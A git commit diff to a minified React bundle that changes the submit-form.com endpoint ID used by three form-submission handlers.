6ada6dc7bc794d926d7004778ebd4b62a2553b3f
netlifyforyou11 <danikhud@proton.me>
2025-05-21 17:29:10 +0500

    Add files via upload

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/w149LITxQ", {
+                                    fetch("https://submit-form.com/12teIqD2U", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/w149LITxQ", {
+                                    u && o ? (fetch("https://submit-form.com/12teIqD2U", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/w149LITxQ", {
+                        fetch("https://submit-form.com/12teIqD2U", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
